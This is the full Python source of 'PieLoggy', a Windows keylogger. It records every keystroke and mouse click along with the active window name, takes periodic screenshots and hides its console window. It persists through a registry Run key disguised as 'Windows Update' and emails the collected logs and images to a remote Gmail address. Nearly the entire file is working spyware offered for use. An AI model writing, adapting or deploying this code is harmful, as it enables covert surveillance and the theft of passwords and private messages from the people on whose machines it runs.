import asyncio
import concurrent.futures
import re
import sys
import win32api
import pythoncom
import pyWinhook as pyHook
import os
import time
import smtplib
import ssl
from winreg import *

pool = concurrent.futures.ThreadPoolExecutor()


class PieLoggy(pyHook.HookManager):
    """PieLoggy Base"""

    def __init__(self, gmail=None, gmail_pass=None, send_to=None, mail_interval=180,
                 folder=False, useScreenshot=True, useEmail=True, ss_interval=30) -> None:
        super().__init__()

        # timer
        self.__start_time_mail = time.time()
        self.__start_time_ss = time.time()
        self.pic_name_list = []

        # email related
        self.gmail_sender = gmail
        self.gmail_sender_pass = gmail_pass
        self.send_to = send_to

        self.mail_interval = mail_interval  # in seconds
        self.ss_interval = ss_interval

        # state
        self.useScreenshot = useScreenshot
        self.useEmail = useEmail

        # directory path
        self.folder = folder or '\\'.join(sys.argv[0].split('\\')[0:-1])
        self.log_path = f'{self.folder}/log.txt'

        # prepare log file for write
        try:
            f = open(self.log_path, 'a')
            f.close()
        except:
            f = open(self.log_path, 'w')
            f.close()

        # set event listener
        self.KeyDown = self.on_keyboard_event
        self.MouseAllButtonsDown = self.on_mouse_event

        # start recording
        self.hook()

    @staticmethod
    def add_startup(args):  # this will add the file path to the startup registry key
        '''Add filepath to the startup registry key in windows'''
        executable_path = os.path.abspath(sys.argv[0])
        file_name = ''
        if executable_path.endswith('.py'):
            file_name += 'python '
        file_name += '"{}" {}'.format(executable_path, args)
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, 'Windows Update', 0, REG_SZ,
                   file_name)

    @staticmethod
    def hide():
        '''hide python console'''
        import win32console
        import win32gui
        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

    def screenshot(self, app_name):
        '''screenshot entire screen'''
        if not self.useScreenshot:
            return
        from datetime import datetime as dt
        import pyautogui

        # replace ':' in time format so it'll be like 'YYYY-MM-DD HH-mm-ss'
        name = f'{re.sub(r":", "-", str(dt.utcnow())[:-7])} {app_name}.png'
        name = re.sub(r"(\\|/|:|\*|\?|\"|<|>|\|)", "", name)
        self.pic_name_list.append(name)
        pyautogui.screenshot(f'{self.folder}/{name}')

    async def mail_it(self):
        '''send screenshot and log with gmail'''
        if not self.gmail_sender or not self.send_to or not self.gmail_sender_pass:
            return
        if not self.useEmail:
            return

        from email import encoders
        from email.mime.base import MIMEBase
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText

        msg = MIMEMultipart()
        msg["From"] = self.gmail_sender
        msg["Subject"] = 'PieLoggy Automatic email from  {}'.format(
            os.getlogin())
        msg['To'] = self.send_to
        msg.attach(
            MIMEText(f'New data from {os.getlogin()}', 'plain', 'utf-8'))

        # attach log files
        log_file = MIMEBase('application', 'octet-stream')
        log_file.set_payload(open(self.log_path, 'r', encoding='utf-8').read())
        encoders.encode_base64(log_file)
        log_file.add_header(
            "Content-Disposition",
            f"attachment; filename=log.txt",
        )
        msg.attach(log_file)

        # attach screenshot
        for img_name in self.pic_name_list:
            ss_image = MIMEBase('application', 'octet-stream')
            ss_image.set_payload(
                open(self.folder + '/' + img_name, 'rb').read())
            encoders.encode_base64(ss_image)
            ss_image.add_header(
                "Content-Disposition",
                f"attachment; filename={img_name}",
            )
            msg.attach(ss_image)

        # smtp session
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls(context=ssl.create_default_context())
        smtp.login(self.gmail_sender, self.gmail_sender_pass)
        smtp.sendmail(self.gmail_sender, self.send_to, msg.as_string())
        smtp.close()

        self.pic_name_list = []
        # f = open(self.log_path, 'a', encoding='utf-8')
        # f.truncate(0)
        # f.close()

    def on_mouse_event(self, event):
        '''function that executed when mouse is clicked'''
        data = (f'[{re.split(" +", str(time.ctime()))[3]}]App:``{str(event.WindowName)}`` '
                f'Button:``{"-".join(str(event.MessageName).split(" "))}`` '
                f'Pos:``{str(event.Position)}``\n')

        if event.Position:
            f = open(self.log_path, 'a', encoding='utf-8')
            f.write(data)
            f.close()

        # mail after every interval seconds
        if int(time.time() - self.__start_time_mail) >= int(self.mail_interval):
            try:
                pool.submit(asyncio.run, self.mail_it())
            except Exception as e:
                print(e)
            self.__start_time_mail = time.time()

        return True

    def on_keyboard_event(self, event):
        '''method that executed on keystroke'''
        keyChar = chr(event.Ascii) if event.Ascii else f'<{str(event.Key)}>'

        data = (f'[{re.split(" +", str(time.ctime()))[3]}]App:``{str(event.WindowName)}`` '
                f'Key:``{keyChar}``\n')

        if event.Key:
            f = open(self.log_path, 'a', encoding='utf-8')
            f.write(data)
            f.close()

        if int(time.time() - self.__start_time_ss) >= int(self.ss_interval):
            self.screenshot(event.WindowName)
            self.__start_time_ss = time.time()

        return True

    def hook(self):
        self.HookKeyboard()
        self.HookMouse()

    def unhook(self):
        self.UnhookKeyboard()
        self.UnhookMouse()


def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--no-screenshot',
                        help='disable screenshot function', action='store_true')
    parser.add_argument('-e', '--no-email',
                        help='disable email send function', action='store_true')
    senderHelp = ('gmail address to send the logs (make sure to turn on '
                  'allow less secure apps in https://myaccount.google.com/lesssecureapps)')
    parser.add_argument('-g', '--sender-gmail',
                        help=senderHelp, metavar='XXX@GMAIL.COM')
    parser.add_argument('-p', '--password', metavar='SECRET_PASS',
                        help='password of the sender gmail account')
    parser.add_argument('-r', '--receiver', metavar='XXX@GMAIL.COM',
                        help='gmail that receive the logs')
    parser.add_argument('-z', '--ss-interval', metavar='SECONDS',
                        help='time in seconds to specify screenshot interval',
                        type=int, default=180)
    parser.add_argument('-m', '--mail-interval',
                        help='time in seconds to specify mail send interval', type=int, default=30)
    parser.add_argument('-f', '--folder', metavar='PATH',
                        help='location of the logs and screenshot folder')
    parser.add_argument('-a', '--add-startup',
                        help='Whether the file should run on startup', action='store_true')
    parser.add_argument('-t', '--try-mail',
                        help='Check whether the gmail account usable', action='store_true')

    args = parser.parse_args()

    # constant variable
    GMAIL = args.sender_gmail
    GMAIL_PASS = args.password
    GMAIL_RECEIVER = args.receiver
    MAIL_INTERVAL = args.mail_interval
    SCREENSHOT = not args.no_screenshot
    USE_EMAIL = not args.no_email
    FOLDER = args.folder
    SS_INTERVAL = args.ss_interval

    PieLoggy.hide()

    if args.try_mail:
        import smtplib
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls()
        try:
            smtp.login(GMAIL, GMAIL_PASS)
            print('Gmail is valid')
            sys.exit(0)
        except Exception:
            print('Gmail is not valid')
            sys.exit(1)

    if args.add_startup:
        args = f"-g {GMAIL} -p {GMAIL_PASS} -r {GMAIL_RECEIVER} --ss-interval={SS_INTERVAL} --mail-interval={MAIL_INTERVAL} -f {FOLDER}"
        if not SCREENSHOT:
            args += ' -s'
        if not USE_EMAIL:
            args += ' -e'
        PieLoggy.add_startup(args)

    # init hook log shit idk
    PieLoggy(gmail=GMAIL, gmail_pass=GMAIL_PASS,
              send_to=GMAIL_RECEIVER, mail_interval=MAIL_INTERVAL,
              useEmail=USE_EMAIL, useScreenshot=SCREENSHOT,
              folder=FOLDER, ss_interval=SS_INTERVAL)

    # Pumps all messages for the current thread until a WM_QUIT message.
    pythoncom.PumpMessages()


if __name__ == '__main__':
    main()  # call main function
